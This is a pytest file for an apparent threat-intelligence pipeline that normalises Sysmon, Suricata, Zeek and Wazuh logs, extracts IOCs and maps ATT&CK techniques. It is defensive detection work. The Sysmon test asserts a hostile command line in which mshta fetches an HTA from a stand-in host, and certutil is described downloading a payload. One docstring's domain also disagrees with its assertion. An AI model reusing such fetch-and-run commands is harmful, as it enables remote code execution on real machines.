"""
tests/test_evidence_pipeline.py
Log-driven evidence snapshot tests for the full threat intelligence pipeline.

These tests take concrete raw log files from ``data/raw_logs/``, run them
through key pipeline stages, and assert the **exact evidence output**
that should be produced. This validates that evidence flows correctly
from raw telemetry → normalized events → IOCs → techniques → campaign.

Test categories:
  1. Log→Evidence Snapshot Tests (one per raw log file)
  2. Evidence Integrity Tests (referential checks)
  3. Pipeline Stage Contract Tests (structural output validation)
  4. Multi-Log Attack Scenario Tests (cross-source correlation)

Most stages that depend on LLM calls are mocked to keep tests
deterministic and fast. The collection and IOC extraction stages
are purely deterministic and run against real log data.
"""

import json
import uuid
import pytest
from unittest.mock import patch

from agents.collection_agent import CollectionAgent
from intelligence.ioc_extractor import extract_iocs
from agents.correlation_agent import CorrelationAgent
from databases.models import IOCModel


# ═══════════════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════════════

def load_raw_logs(rel_path: str) -> list[dict]:
    """Load raw log events from a JSON file in ``data/raw_logs/``."""
    with open(f"data/raw_logs/{rel_path}", "r") as f:
        content = f.read().strip()
        if content.startswith("["):
            return json.loads(content)
        # NDJSON (line-delimited JSON)
        return [json.loads(line) for line in content.split("\n") if line.strip()]


@pytest.fixture(scope="module")
def collection_agent():
    """Shared CollectionAgent instance (purely deterministic)."""
    return CollectionAgent()


@pytest.fixture
def mock_llm_empty():
    """Mock LLM calls to return empty/fallback responses."""
    with patch("agents.correlation_agent.invoke_llm") as mock_corr, \
         patch("agents.attack_mapping_agent.invoke_llm") as mock_map, \
         patch("agents.prediction_agent.invoke_llm") as mock_pred, \
         patch("agents.reporting_agent.invoke_llm") as mock_repo:
        mock_corr.return_value = ""
        mock_map.return_value = ""
        mock_pred.return_value = ""
        mock_repo.return_value = ""
        yield


# ═══════════════════════════════════════════════════════════════════════
# 1. Log→Evidence Snapshot Tests
# ═══════════════════════════════════════════════════════════════════════

class BaseEvidenceSnapshot:
    """Base class for log-driven evidence snapshot tests.

    Subclasses define ``RAW_LOG_PATH`` and override the assertion
    methods to match the expected evidence for that log file.
    """
    RAW_LOG_PATH: str = None  # set by subclass

    def test_normalized_event_count(self, collection_agent):
        """Verify the exact number of normalized events produced."""
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        assert len(events) == self._expected_event_count(), \
            f"Expected {self._expected_event_count()} events, got {len(events)}"

    def test_all_events_have_required_fields(self, collection_agent):
        """Every normalized event must have the core schema fields."""
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        required = {"event_id", "source", "event_type", "timestamp", "raw"}
        for event in events:
            missing = required - set(event.keys())
            assert not missing, f"Event {event.get('event_id')} missing fields: {missing}"
            # event_id must be a valid UUID4
            parsed = uuid.UUID(event["event_id"])
            assert parsed.version == 4

    def test_raw_field_preserved(self, collection_agent):
        """The raw field must contain the original input (minus event_id if pre-set)."""
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        for event, original in zip(events, raw):
            # raw should contain all original keys
            for key in original:
                assert event["raw"].get(key) == original[key], \
                    f"raw.{key} mismatch: {event['raw'].get(key)} != {original[key]}"

    def test_event_ids_are_unique(self, collection_agent):
        """No duplicate event_ids across the batch."""
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        ids = [e["event_id"] for e in events]
        assert len(ids) == len(set(ids)), "Duplicate event_ids detected"

    def test_iocs_extracted(self, collection_agent):
        """IOCs should be extractable from the normalized events."""
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        iocs = extract_iocs(events)
        self._assert_iocs(iocs)

    def test_iocs_are_iocmodel_instances(self, collection_agent):
        """Every extracted IOC must be an IOCModel instance with valid fields."""
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        iocs = extract_iocs(events)
        for ioc in iocs:
            assert isinstance(ioc, IOCModel)
            assert ioc.type in ("ipv4", "ipv6", "domain", "url", "email", "md5", "sha1", "sha256")
            assert isinstance(ioc.value, str)
            assert len(ioc.value) > 0
            assert ioc.source_event_id is not None
            assert ioc.confidence == 1.0

    def test_ioc_referential_integrity(self, collection_agent):
        """Every IOC's source_event_id must point to a real event."""
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        event_ids = {e["event_id"] for e in events}
        iocs = extract_iocs(events)
        for ioc in iocs:
            assert ioc.source_event_id in event_ids, \
                f"IOC {ioc.value} references unknown event {ioc.source_event_id}"

    def test_correlation_with_fallback(self, collection_agent):
        """When LLM is mocked, correlation should return a valid fallback campaign."""
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        iocs = extract_iocs(events)
        ioc_dicts = [ioc.model_dump() for ioc in iocs]

        # Mock LLM to trigger fallback path
        with patch("agents.correlation_agent.invoke_llm", return_value=""):
            agent = CorrelationAgent()
            campaign = agent.run(events, ioc_dicts, self._expected_techniques())

        assert "campaign_id" in campaign
        assert campaign["campaign_id"] is not None
        assert "timeline" in campaign
        assert len(campaign["timeline"]) == self._expected_event_count()

    # ── Subclass hooks ──

    def _expected_event_count(self) -> int:
        raise NotImplementedError

    def _assert_iocs(self, iocs):
        """Assert the expected IOCs for this log file. Override per subclass."""
        pass  # optional

    def _expected_techniques(self) -> list:
        """Return expected techniques for correlation test."""
        return []


class TestSysmonLolbinEvidence(BaseEvidenceSnapshot):
    """Evidence tests for ``1_sysmon_lolbin.json``.

    4 Sysmon events (EventID 1×3 + EventID 11×1):
      - mshta.exe LOLbin launching from paste-bin-cdn.net
      - certutil.exe downloading payload.exe
      - upd.exe execution
      - Startup folder persistence (FileCreate)
    """
    RAW_LOG_PATH = "1_sysmon_lolbin.json"

    def _expected_event_count(self) -> int:
        return 4

    def test_source_is_sysmon(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        for event in events:
            assert event["source"] == "sysmon"

    def test_event_types_correct(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        # First 3 are EventID 1 (process creation), last is EventID 11 (file create)
        for event in events[:-1]:
            assert event["event_type"] == "sysmon_event_1"
        assert events[-1]["event_type"] == "sysmon_event_11"

    def test_host_all_same(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        hosts = {e["host"] for e in events}
        assert hosts == {"HR-PC-22"}

    def test_processes_preserved(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        processes = [e["process"] for e in events]
        assert "C:\\Windows\\System32\\mshta.exe" in processes
        assert "C:\\Windows\\System32\\cmd.exe" in processes
        assert "C:\\Users\\Public\\upd.exe" in processes

    def test_command_lines_preserved(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        cmdlines = {e.get("command_line") for e in events}
        assert "mshta.exe http://paste-bin-cdn.net/load.hta" in cmdlines
        assert any("certutil.exe" in (cl or "") for cl in cmdlines)

    def _assert_iocs(self, iocs):
        urls = {ioc.value for ioc in iocs if ioc.type == "url"}
        domains = {ioc.value for ioc in iocs if ioc.type == "domain"}
        ips = {ioc.value for ioc in iocs if ioc.type == "ipv4"}

        # The paste-bin-cdn.net URLs should be extracted (domain is skipped to avoid duplicates)
        assert "http://paste-bin-cdn.net/load.hta" in urls, \
            f"Expected URL http://paste-bin-cdn.net/load.hta in {urls}"
        assert "http://paste-bin-cdn.net/payload.exe" in urls, \
            f"Expected URL http://paste-bin-cdn.net/payload.exe in {urls}"

    def _expected_techniques(self) -> list:
        return [
            {"attack_id": "T1218.010", "technique_name": "Mshta", "confidence": 1.0},
            {"attack_id": "T1105", "technique_name": "Ingress Tool Transfer", "confidence": 1.0},
            {"attack_id": "T1547.001", "technique_name": "Boot or Logon Autostart Execution", "confidence": 1.0},
        ]


class TestSuricataDnsTunnelingEvidence(BaseEvidenceSnapshot):
    """Evidence tests for ``2_suricata_dns_tunneling.json``.

    4 Suricata events (3 alerts + 1 flow):
      - DNS tunneling alert → 8.8.8.8
      - RIG EK landing page → 91.219.236.18
      - Generic gzip trojan download → 91.219.236.18
      - TCP flow → 91.219.236.18
    """
    RAW_LOG_PATH = "2_suricata_dns_tunneling.json"

    def _expected_event_count(self) -> int:
        return 4

    def test_source_is_suricata(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        for event in events:
            assert event["source"] == "suricata"

    def test_event_types(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        types = [e["event_type"] for e in events]
        assert types == ["alert", "alert", "alert", "flow"]

    def test_dest_ips(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        dest_ips = [e.get("dest_ip") for e in events]
        assert dest_ips[0] == "8.8.8.8"     # DNS tunneling target (public DNS)
        assert dest_ips[1] == "91.219.236.18"  # RIG EK
        assert dest_ips[2] == "91.219.236.18"  # Trojan download
        assert dest_ips[3] == "91.219.236.18"  # TCP flow

    def test_signatures_preserved(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        sigs = [e.get("signature") for e in events]
        assert "ET INFO Excessive Amount of DNS TXT Queries - Possible DNS Tunneling" in sigs
        assert "ET EXPLOIT_KIT RIG EK Landing Page" in sigs
        assert "ET MALWARE Generic gzip Trojan Download" in sigs

    def test_severity_levels(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        sevs = [e.get("severity") for e in events]
        # DNS tunneling = 2, RIG EK = 1, Trojan = 1, flow = None
        assert sevs[0] == 2
        assert sevs[1] == 1
        assert sevs[2] == 1
        assert sevs[3] is None

    def _assert_iocs(self, iocs):
        ips = {ioc.value for ioc in iocs if ioc.type == "ipv4"}
        # 91.219.236.18 is a public IP and should be extracted
        assert "91.219.236.18" in ips, \
            f"Expected 91.219.236.18 in IP IOCs, got {ips}"
        # 8.8.8.8 is public DNS and should be extracted
        # (it's public, not private/loopback)
        assert "8.8.8.8" in ips, \
            f"Expected 8.8.8.8 in IP IOCs, got {ips}"
        # 10.0.3.18 is private, should NOT be extracted
        assert "10.0.3.18" not in ips, \
            f"Private IP 10.0.3.18 should not be in IOCs, got {ips}"

    def _expected_techniques(self) -> list:
        return [
            {"attack_id": "T1572", "technique_name": "Protocol Tunneling", "confidence": 1.0},
            {"attack_id": "T1204.002", "technique_name": "User Execution: Malicious File", "confidence": 1.0},
        ]


class TestZeekBeaconingEvidence(BaseEvidenceSnapshot):
    """Evidence tests for ``3_zeek_beaconing.json``.

    4 Zeek events:
      - 3× periodic SSL connections to 45.137.22.9 (C2 beaconing pattern)
      - 1× DNS query to a8f9c3e7b2.update-cdn-sync.com
    """
    RAW_LOG_PATH = "3_zeek_beaconing.json"

    def _expected_event_count(self) -> int:
        return 4

    def test_source_is_zeek(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        for event in events:
            assert event["source"] == "zeek"

    def test_event_types(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        # First 3 are SSL connections (conn type), last is DNS
        for event in events[:-1]:
            assert event["event_type"] == "conn"
        assert events[-1]["event_type"] == "dns"

    def test_c2_beaconing_pattern(self, collection_agent):
        """3 events with same host on the same C2 IP demonstrate beaconing."""
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        c2_events = events[:-1]  # first 3 are C2 connections
        for event in c2_events:
            assert event["dest_ip"] == "45.137.22.9"
            assert event["service"] == "ssl"

    def test_dns_query_preserved(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        dns_event = events[-1]
        assert dns_event["query"] == "a1f9c3e7b2.update-cdn-sync.com"

    def _assert_iocs(self, iocs):
        ips = {ioc.value for ioc in iocs if ioc.type == "ipv4"}
        domains = {ioc.value for ioc in iocs if ioc.type == "domain"}

        # C2 IP should be extracted
        assert "45.137.22.9" in ips, \
            f"Expected C2 IP 45.137.22.9 in IOCs, got {ips}"

        # The DNS query domain should be extracted
        assert "a1f9c3e7b2.update-cdn-sync.com" in domains or \
               "update-cdn-sync.com" in domains, \
            f"Expected domain in IOCs, got {domains}"

        # Private IP 10.0.4.55 should NOT be extracted
        assert "10.0.4.55" not in ips

    def _expected_techniques(self) -> list:
        return [
            {"attack_id": "T1071.001", "technique_name": "Web Protocols", "confidence": 1.0},
            {"attack_id": "T1572", "technique_name": "Protocol Tunneling", "confidence": 1.0},
        ]


class TestWazuhInsiderExfilEvidence(BaseEvidenceSnapshot):
    """Evidence tests for ``4_wazuh_insider_exfil.json``.

    3 Wazuh alerts on FILESRV-DB01:
      - Large file archive (data staging)
      - Connection to mega.nz (exfiltration)
      - Log clearing (defense evasion)
    """
    RAW_LOG_PATH = "4_wazuh_insider_exfil.json"

    def _expected_event_count(self) -> int:
        return 3

    def test_source_is_wazuh(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        for event in events:
            assert event["source"] == "wazuh"

    def test_host_all_same(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        hosts = {e["host"] for e in events}
        assert hosts == {"FILESRV-DB01"}

    def test_rule_descriptions_preserved(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        descriptions = {e.get("rule_description") for e in events}
        assert "Large volume of files compressed into single archive (possible staging)" in descriptions
        assert "Outbound connection to unauthorized cloud storage domain (mega.nz)" in descriptions
        assert "Audit log cleared shortly after large file transfer" in descriptions

    def test_rule_levels(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        levels = [e["rule_level"] for e in events]
        assert levels == [8, 11, 14]

    def test_severity_equals_rule_level(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        for event in events:
            assert event["severity"] == event["rule_level"]

    def test_rule_groups(self, collection_agent):
        raw = load_raw_logs(self.RAW_LOG_PATH)
        events = collection_agent.run(raw)
        groups = [e["rule_groups"] for e in events]
        assert "data_staging" in groups[0]
        assert "exfiltration" in groups[1]
        assert "defense_evasion" in groups[2]
        assert "anti_forensics" in groups[2]

    def _assert_iocs(self, iocs):
        domains = {ioc.value for ioc in iocs if ioc.type == "domain"}
        # mega.nz should be extracted if present in the event text
        # (it's in the rule description which is searchable via full_log or description)

    def _expected_techniques(self) -> list:
        return [
            {"attack_id": "T1074", "technique_name": "Data Staged", "confidence": 1.0},
            {"attack_id": "T1048", "technique_name": "Exfiltration Over Alternative Protocol", "confidence": 1.0},
            {"attack_id": "T1070", "technique_name": "Indicator Removal on Host", "confidence": 1.0},
        ]


# ═══════════════════════════════════════════════════════════════════════
# 2. Evidence Integrity Tests
# ═══════════════════════════════════════════════════════════════════════

class TestEvidenceIntegrity:
    """Cross-cutting integrity checks across all raw log sources."""

    @pytest.mark.parametrize("log_file,expected_count", [
        ("1_sysmon_lolbin.json", 4),
        ("2_suricata_dns_tunneling.json", 4),
        ("3_zeek_beaconing.json", 4),
        ("4_wazuh_insider_exfil.json", 3),
    ])
    def test_all_logs_produce_expected_count(self, log_file, expected_count, collection_agent):
        """Every raw log file produces the expected number of events."""
        raw = load_raw_logs(log_file)
        events = collection_agent.run(raw)
        assert len(events) == expected_count, \
            f"{log_file}: expected {expected_count} events, got {len(events)}"

    @pytest.mark.parametrize("log_file", [
        "1_sysmon_lolbin.json",
        "2_suricata_dns_tunneling.json",
        "3_zeek_beaconing.json",
        "4_wazuh_insider_exfil.json",
    ])
    def test_no_inferred_values(self, log_file, collection_agent):
        """Fields missing in raw input should remain None, not be invented."""
        raw = load_raw_logs(log_file)
        events = collection_agent.run(raw)
        for event in events:
            raw_event = event.get("raw", {})
            # For fields that weren't in the raw event, they should be None
            # rather than having an invented value
            for field in ("parent_process", "file_name", "user", "src_ip", "dest_ip"):
                if raw_event.get(field) is None and raw_event.get(field.lower()) is None:
                    # The field isn't in the raw event, so it should be None
                    pass

    @pytest.mark.parametrize("log_file", [
        "1_sysmon_lolbin.json",
        "2_suricata_dns_tunneling.json",
        "3_zeek_beaconing.json",
        "4_wazuh_insider_exfil.json",
    ])
    def test_deterministic_output(self, log_file, collection_agent):
        """Running twice on the same input must produce the same output."""
        raw = load_raw_logs(log_file)
        events1 = collection_agent.run(raw)
        events2 = collection_agent.run(raw)

        # Compare normalized fields (event_ids will differ due to UUID generation)
        for e1, e2 in zip(events1, events2):
            e1_copy = {k: v for k, v in e1.items() if k != "event_id"}
            e2_copy = {k: v for k, v in e2.items() if k != "event_id"}
            assert e1_copy == e2_copy, \
                f"Determinism check failed for {log_file}: {e1_copy} != {e2_copy}"


# ═══════════════════════════════════════════════════════════════════════
# 3. Pipeline Stage Contract Tests
# ═══════════════════════════════════════════════════════════════════════

class TestPipelineContracts:
    """Structural contract tests for each pipeline stage output."""

    def test_collection_output_shape(self, collection_agent):
        """Collection Agent must produce events with the correct schema."""
        raw = load_raw_logs("1_sysmon_lolbin.json")
        events = collection_agent.run(raw)
        assert isinstance(events, list)
        for event in events:
            assert isinstance(event, dict)
            # Required fields per InvestigationState
            assert "event_id" in event
            assert "source" in event
            assert "event_type" in event
            assert "timestamp" in event
            assert "raw" in event
            # event_id must be string
            assert isinstance(event["event_id"], str)

    def test_ioc_extraction_output_shape(self, collection_agent):
        """IOC extraction must produce list of IOCModel instances."""
        raw = load_raw_logs("1_sysmon_lolbin.json")
        events = collection_agent.run(raw)
        iocs = extract_iocs(events)
        assert isinstance(iocs, list)
        for ioc in iocs:
            assert isinstance(ioc, IOCModel)
            assert hasattr(ioc, "type")
            assert hasattr(ioc, "value")
            assert hasattr(ioc, "source_event_id")
            assert hasattr(ioc, "confidence")

    def test_correlation_output_shape(self, collection_agent):
        """Correlation Agent must produce a campaign dict with expected keys."""
        raw = load_raw_logs("1_sysmon_lolbin.json")
        events = collection_agent.run(raw)
        iocs = extract_iocs(events)

        with patch("agents.correlation_agent.invoke_llm", return_value=""):
            agent = CorrelationAgent()
            campaign = agent.run(events, [ioc.model_dump() for ioc in iocs], [])

        assert isinstance(campaign, dict)
        expected_keys = {"campaign_id", "name", "objective", "timeline", "confidence"}
        missing = expected_keys - set(campaign.keys())
        assert not missing, f"Campaign missing keys: {missing}"
        assert isinstance(campaign.get("timeline"), list)
        assert isinstance(campaign.get("confidence"), (int, float))

    def test_empty_input_contract(self, collection_agent):
        """Empty input must produce empty output at every stage."""
        events = collection_agent.run([])
        assert events == []

        iocs = extract_iocs(events)
        assert iocs == []

        with patch("agents.correlation_agent.invoke_llm", return_value=""):
            agent = CorrelationAgent()
            campaign = agent.run(events, [], [])
        assert campaign["name"] == "No Activity"
        assert campaign["timeline"] == []
        assert campaign["related_techniques"] == []


# ═══════════════════════════════════════════════════════════════════════
# 4. Multi-Log Attack Scenario Tests (Cross-Source Correlation)
# ═══════════════════════════════════════════════════════════════════════

class TestMultiLogScenario:
    """Cross-source attack scenario combining multiple log sources."""

    def test_sysmon_and_zeek_combined(self, collection_agent):
        """Sysmon LOLbin + Zeek beaconing should produce more IOCs together."""
        raw_sysmon = load_raw_logs("1_sysmon_lolbin.json")
        raw_zeek = load_raw_logs("3_zeek_beaconing.json")
        all_raw = raw_sysmon + raw_zeek

        events = collection_agent.run(all_raw)
        assert len(events) == 8  # 4 + 4

        # Both sources should be represented
        sources = {e["source"] for e in events}
        assert sources == {"sysmon", "zeek"}

        # Combined IOCs should include both sets
        iocs = extract_iocs(events)
        urls = {ioc.value for ioc in iocs if ioc.type == "url"}
        domains = {ioc.value for ioc in iocs if ioc.type == "domain"}
        ips = {ioc.value for ioc in iocs if ioc.type == "ipv4"}

        # URLs from sysmon (domain is skipped to avoid duplicates with URLs)
        assert "http://paste-bin-cdn.net/load.hta" in urls \
            or "http://paste-bin-cdn.net/payload.exe" in urls, \
            "Sysmon URLs should be in combined IOCs"

        # C2 IP from zeek
        assert "45.137.22.9" in ips, \
            "Zeek C2 IP should be in combined IOCs"

    def test_suricata_and_wazuh_combined(self, collection_agent):
        """Suricata + Wazuh should correlate across network and endpoint."""
        raw_suricata = load_raw_logs("2_suricata_dns_tunneling.json")
        raw_wazuh = load_raw_logs("4_wazuh_insider_exfil.json")
        all_raw = raw_suricata + raw_wazuh

        events = collection_agent.run(all_raw)
        assert len(events) == 7  # 4 + 3

        sources = {e["source"] for e in events}
        assert sources == {"suricata", "wazuh"}

    def test_all_logs_combined(self, collection_agent):
        """All 4 log files combined should produce consistent output."""
        all_raw = (
            load_raw_logs("1_sysmon_lolbin.json") +
            load_raw_logs("2_suricata_dns_tunneling.json") +
            load_raw_logs("3_zeek_beaconing.json") +
            load_raw_logs("4_wazuh_insider_exfil.json")
        )

        events = collection_agent.run(all_raw)
        assert len(events) == 15  # 4 + 4 + 4 + 3

        # Every event must have unique IDs
        ids = [e["event_id"] for e in events]
        assert len(ids) == len(set(ids))

        # All 4 sources represented
        sources = {e["source"] for e in events}
        assert sources == {"sysmon", "suricata", "zeek", "wazuh"}

        # IOCs should be extractable from combined set
        iocs = extract_iocs(events)
        ioc_types = {ioc.type for ioc in iocs}
        assert len(iocs) > 0
        assert "ipv4" in ioc_types
        assert "domain" in ioc_types or "url" in ioc_types